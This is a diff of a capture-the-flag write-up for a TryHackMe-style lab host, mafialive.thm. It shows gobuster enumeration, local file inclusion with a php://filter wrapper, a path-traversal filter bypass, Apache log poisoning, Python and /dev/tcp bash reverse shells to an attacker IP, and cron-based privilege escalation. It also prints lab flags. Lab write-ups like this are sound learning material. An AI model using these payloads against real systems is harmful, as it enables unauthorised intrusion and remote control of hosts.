@@ -140,7 +140,8 @@ flag: ``` thm{f0und_th3_r1ght_h0st_n4m3} ```
 
 3. Look for a page under development
 To answer this question all you have to do is run gobuster
->command used: gobuster dir -u mafialive.thm -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
+
+command:```gobuster dir -u mafialive.thm -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip```
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~]
@@ -173,7 +174,7 @@ Progress: 23050 / 23075 (99.89%)
 ```
 The scan above reveals robots.txt and /test.php. And Robots.txt disallows test.php.
 
-Going over to /test.php
+Going over to ```/test.php```
 
 ![image](https://user-images.githubusercontent.com/67879936/222672372-7b9bfeb4-ec49-493a-a3ac-5167abf0d7c7.png)
 
@@ -189,17 +190,19 @@ I guess this answers our third question
 
 The button on the test.php page is revealing this url
 
+```
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
+```
 
 With this url displayed I think we got oursleves an LFI(Local File Inclusion)
 
 To be able to read the source code we can use a PHP wrapper filter. In this case we will use the one that encodes the content in base64
 
-If you want to read more on PHP wrapper filter you can use this link: [PayloadsAllTheThings — Wrapper php://filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)
+If you want to read more on PHP wrapper filter you can use this [link]([PayloadsAllTheThings — Wrapper php://filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter))
 
 Here is how we can actually use it for our host
 
-command url: http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+command: ```http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php```
 
 Now, using the PHP wrapper filter that encodes content in base64
 
@@ -209,17 +212,17 @@ We got a base64 encoded text, we can go ahead to decode it to confirm if it is s
 
 ![image](https://user-images.githubusercontent.com/67879936/222673213-554175cb-8a9a-4c8c-8135-9f15f58869cc.png)
 
->command: echo “PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==” | base64 — decode
+command:```echo “PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==” | base64 — decode```
 
 Now, lets try this on /test.php (the one we tried earlier was on mrrobot.php)
 
-url: http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+url: ```http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php```
 
 ![image](https://user-images.githubusercontent.com/67879936/222673661-fbea35e1-6564-4b18-9c07-7519e6b95b4c.png)
 
 Well, we got ourselves another base64 encoded text. Let’s try decoding this
 
->command: echo “base64” | base64 — decode
+command:```echo “base64” | base64 — decode```
 
 Decoding the text we found this
 
@@ -233,14 +236,14 @@ Flag2:```thm{explo1t1ng_lf1}```
 
 Now, since we got ourselves an LFI(Local File Inclusion), let’s try to read the /etc/passwd file. I want you to note that there's a filter that filters out ```../../../``` so it shouldn't contain that, so to bypass that we'll be using 2 dots and a dot, something like this ```.././.././```
 
-url:http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd
+url:```http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd```
 
 
 ![image](https://user-images.githubusercontent.com/67879936/222675948-c66c14b6-feee-43c3-8d18-bfef3fcba19a.png)
 
 seeing how we can view the /etc/passwd file, lets go ahead to check if we can access apache log
 
-url: http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log
+url: ```http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log```
 
 ![image](https://user-images.githubusercontent.com/67879936/222676031-b15c350a-e5bb-4204-b693-701c0425a2a4.png)
 
@@ -251,7 +254,7 @@ To do this I will use netcat and curl
 
 To poison the log
 
->command: nc mafialive.thm 80
+command: ```nc mafialive.thm 80```
 
 After doing this I will inject a php payload
 
@@ -263,7 +266,7 @@ Now, you will get a response saying “Bad Request”
 
 Lets go ahead to check if we were able to poison the log
 
->command: curl -s “http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=id"
+command: ```curl -s “http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=id"```
 
 ![image](https://user-images.githubusercontent.com/67879936/222676579-cdb9fa67-a24f-405c-a20f-3d3d760f80b1.png)
 
@@ -275,11 +278,11 @@ Encoded payload:```python3%20-c%20'import%20socket,subprocess,os;s=socket.socket
 
 Then we will also have to set up a listener on our machine
 
->rlwrap nc -lvnp 1234
+```rlwrap nc -lvnp 1234```
 
 Now, all we have left is to add the payload to our url and we wait to get a reverse shell
 
->command: curl -s “http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.18.103.121%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)'"
+command:```curl -s “http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.18.103.121%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)'"```
 
 ![image](https://user-images.githubusercontent.com/67879936/222677190-4df8a6bc-4838-4427-ba05-4aaf2260c80e.png)
 
@@ -303,7 +306,7 @@ Now, let’s go ahead to grab the user’s flag
 
 Now, I do use the find command to actually look for flags because it basically looks for the flag and gives me the path to the flag. I do this because it’s not every time the flag is always located in the home directory
 
->command: find / 2>/dev/null | grep -i “user.txt”
+command:```find / 2>/dev/null | grep -i “user.txt”```
 
 ![image](https://user-images.githubusercontent.com/67879936/222677796-f6aa59d9-6dc0-4d97-9a59-270e7bc906a6.png)
 
@@ -322,7 +325,7 @@ Our focus here will be privilege escalation
 
 There is a cronjob running on the system
 
->command: cat /etc/crontab
+command:```cat /etc/crontab```
 
 ![image](https://user-images.githubusercontent.com/67879936/222678675-2cfe6385-ad63-459b-ac4f-7525b8b7f2b2.png)
 
@@ -330,13 +333,13 @@ From the above screenshot we can see that /opt/helloworld.sh is running as a cro
 
 reverse shell:```/bin/bash -i >& /dev/tcp/10.18.103.121/1337 0>&1```
 
->command: echo “/bin/bash -i >& /dev/tcp/10.18.103.121/1337 0>&1” >> /opt/helloworld.sh
+command:```echo “/bin/bash -i >& /dev/tcp/10.18.103.121/1337 0>&1” >> /opt/helloworld.sh```
 
 ![image](https://user-images.githubusercontent.com/67879936/222678836-36c62a45-9ec0-4e50-999a-1ecad51161d1.png)
 
 Then we start a netcat listener for incoming connections
 
->netcat listener: rlwrap nc -lvnp 1337
+netcat listener:```rlwrap nc -lvnp 1337```
 
 ![image](https://user-images.githubusercontent.com/67879936/222678927-e529fb6e-60a0-4eae-883c-8741e98cbf01.png)
 
@@ -344,7 +347,7 @@ From the above screenshot you can see that we got a shell as user “archangel�
 
 Now, to look for the user 2 flag we run the find command
 
->command: find / 2>/dev/null | grep -i “user2.txt”
+command:```find / 2>/dev/null | grep -i “user2.txt”```
 
 ![image](https://user-images.githubusercontent.com/67879936/222679116-83fadb7e-f3f9-4585-b94f-d3774a9ee77c.png)
 
@@ -357,7 +360,7 @@ Now that we have gotten the flag for this task let’s move on to the last task
 
 We will use the find command to search for suid binaries
 
->command: find / -perm -u=s -type f 2>/dev/null
+command:```find / -perm -u=s -type f 2>/dev/null```
 
 ![image](https://user-images.githubusercontent.com/67879936/222679436-fa12b443-599f-4abb-b26a-e75eb88925fd.png)
 
